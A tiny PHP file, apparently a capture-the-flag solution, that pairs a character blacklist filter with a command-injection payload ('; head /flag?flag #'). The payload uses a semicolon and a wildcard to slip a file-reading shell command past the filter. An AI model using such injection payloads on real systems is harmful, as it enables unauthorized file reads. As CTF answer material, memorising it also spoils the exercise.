<?php

// solution
$data = "; head /flag?flag #";

function filter($data) {
    $black_list_char = array('"', "'", "\n", "*", "!", ".", "-", "_","@");
    foreach ($black_list_char as $key) {
        $data = str_replace($key, '', $data);
    }
    return $data;
}

echo $data;